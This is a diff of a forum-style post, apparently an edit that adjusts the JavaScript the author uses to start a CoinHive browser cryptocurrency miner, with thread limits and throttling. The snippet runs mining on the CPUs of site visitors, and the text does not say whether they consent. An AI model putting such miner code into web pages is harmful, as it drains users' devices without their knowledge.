@@ -37,10 +37,12 @@ That said, The code I use to start the miner is:
 ```javascript
 var miner = new CoinHive.Anonymous('....my id on coinhive');
 
-miner.setNumThreads(Math.ceil(miner.getNumThreads()/2));
+miner.setNumThreads(Math.min(Math.ceil(miner.getNumThreads()/2), 4));
 
 //5 seconds delay 
-setTimeout(startMiner, 5000);
+setTimeout(startMiner, 5000)
+
+miner.setThrottle(0.5)
 
 function startMiner() {
 
